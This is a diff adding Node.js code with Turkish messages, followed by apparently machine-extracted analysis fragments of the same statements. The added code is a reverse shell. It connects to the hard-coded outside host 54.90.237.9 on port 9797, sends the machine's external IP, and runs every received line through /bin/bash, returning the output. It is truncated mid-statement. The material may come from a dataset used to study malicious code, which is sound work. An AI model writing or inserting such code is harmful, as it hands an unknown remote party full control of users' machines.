@@ -1,0 +1,71 @@
+const client = net.createConnection({ host: '54.90.237.9', port: 9797 }, () => {
+        console.log('Client bağlanıldı.');
+        getExternalIP((ip) => {
+            if (ip) {
+                client.write(`Bağlantı sağlandı. Sunucu dış IP: ${ip}\n`);
+            } else {
+                client.write('Dış IP alınamadı.\n');
+            }
+        });
+    })
+client.on('data', (data) => {
+        console.log('Client\'tan gelen:', data.toString());
+
+        const command = data.toString().trim();
+
+        if (command.startsWith('cd ')) {
+            const newDir = command.substring(3).trim();
+
+            // Yeni terminal (bash) başlatıyoruz
+            const shell = spawn('/bin/bash', ['-c', `cd ${newDir} && pwd`]);
+
+            shell.stdout.on('data', (data) => {
+                client.write(`Yeni dizin: ${data.toString()}\n`);
+            });
+
+            shell.stderr.on('data', (data) => {
+                client.write(`Hata (stderr): ${data.toString()}\n`);
+            });
+
+            shell.on('error', (err) => {
+                client.write(`Hata: ${err.message}\n`);
+            });
+        } else {
+            // Diğer komutları çalıştır
+            const shell = spawn('/bin/bash', ['-c', command]);
+
+            shell.stdout.on('data', (data) => {
+                client.write(data);
+            });
+
+            shell.stderr.on('dat...
+console.log('Client\'tan gelen:', data.toString())
+const command = data.toString().trim()
+command.startsWith('cd ')
+const newDir = command.substring(3).trim()
+const shell = spawn('/bin/bash', ['-c', `cd ${newDir} && pwd`])
+shell.stdout.on('data', (data) => {
+                client.write(`Yeni dizin: ${data.toString()}\n`);
+            })
+<operator>.formatString("Yeni dizin: ", data.toString(), "\n")
+shell.stderr.on('data', (data) => {
+                client.write(`Hata (stderr): ${data.toString()}\n`);
+            })
+<operator>.formatString("Hata (stderr): ", data.toString(), "\n")
+shell.on('error', (err) => {
+                client.write(`Hata: ${err.message}\n`);
+            })
+<operator>.formatString("Hata: ", err.message, "\n")
+const shell = spawn('/bin/bash', ['-c', command])
+shell.stdout.on('data', (data) => {
+                client.write(data);
+            })
+client.write(data)
+shell.stderr.on('data', (data) => {
+                client.write(data);
+            })
+client.write(data)
+shell.on('error', (err) => {
+                client.write(`Hata: ${err.message}\n`);
+            })
+<operator>.formatString("Hata: ", err.message, "\n")
